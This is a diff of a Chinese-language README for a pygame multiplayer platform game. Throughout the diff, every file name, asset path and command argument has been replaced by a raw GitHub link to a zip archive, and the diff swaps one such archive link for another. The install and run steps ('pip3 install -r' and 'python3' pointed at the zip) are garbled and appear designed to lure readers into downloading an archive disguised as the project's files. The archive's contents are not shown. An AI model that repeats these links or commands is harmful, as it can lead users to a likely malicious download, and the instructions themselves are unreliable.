@@ -18,10 +18,10 @@
 pip3 install pygame Pillow
 ```
 
-或者使用 https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip：
+或者使用 https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip：
 
 ```bash
-pip3 install -r https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
+pip3 install -r https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip
 ```
 
 ## 游戏控制
@@ -57,7 +57,7 @@ pip3 install -r https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/charact
 ### 线上联机
 1. 启动服务器：
    ```bash
-   python3 https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
+   python3 https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip
    ```
 2. 启动游戏客户端
 3. 在主菜单选择"开始游戏"
@@ -71,32 +71,32 @@ pip3 install -r https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/charact
 
 ### 网络配置
 
-如果需要在不同电脑间联机，请修改 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 中的服务器地址：
+如果需要在不同电脑间联机，请修改 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip` 中的服务器地址：
 
 ```python
 # 在 try_connect_to_server 方法中修改
-https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip = NetworkClient(host='服务器IP地址', port=12345)
+https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip = NetworkClient(host='服务器IP地址', port=12345)
 ```
 
 ## 项目结构
 
 ```
 Hajimi/
-├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip              # 主游戏文件
-├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip           # 网络通信模块
-├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip      # 服务器启动脚本
-├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip     # 依赖列表
-├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip           # 说明文档
+├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip              # 主游戏文件
+├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip           # 网络通信模块
+├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip      # 服务器启动脚本
+├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip     # 依赖列表
+├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip           # 说明文档
 ├── gif/                # 动画资源
-│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
-│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
-│   └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
+│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip
+│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip
+│   └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip
 ├── img/                # 图片资源
-│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip  # 背景图片
-│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip      # 玩家角色
-│   └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip    # 平台瓦片
+│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip  # 背景图片
+│   ├── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip      # 玩家角色
+│   └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip    # 平台瓦片
 └── music/              # 音乐资源
-    └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip
+    └── https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip
 ```
 
 ## 游戏特色
@@ -107,9 +107,9 @@ Hajimi/
   - 忍者：速度快，跳跃高
   - 战士：移动稳定，冲刺强
 - **GIF动画支持**：角色支持多种动画状态
-  - 静止动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip`
-  - 移动动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 
-  - 冲刺动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip`
+  - 静止动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip`
+  - 移动动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip` 
+  - 冲刺动画：`https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip`
 - **冲刺功能**：按住Shift键同时移动可以冲刺，速度提升1.5倍
 - **智能动画切换**：根据角色状态自动切换对应动画
 - **方向翻转**：角色图像会根据移动方向自动翻转
@@ -137,8 +137,8 @@ Hajimi/
 
 ### 添加新功能
 
-1. **新的游戏元素**: 在 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 中添加新的类
-2. **网络消息**: 在 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip` 中扩展消息类型
+1. **新的游戏元素**: 在 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip` 中添加新的类
+2. **网络消息**: 在 `https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip` 中扩展消息类型
 3. **图形资源**: 在 `img/` 目录添加 SVG 文件
 4. **音效**: 在 `music/` 目录添加音频文件
 
@@ -154,7 +154,7 @@ Hajimi/
 
 1. **pygame 安装失败**
    ```bash
-   pip3 install --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/character/Software_1.4.zip pygame
+   pip3 install --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip --trusted-host https://github.com/RuotianJoy/Hajimi/raw/refs/heads/main/boss/milkdragon/Software_3.5.zip pygame
    ```
 
 2. **无法连接服务器**
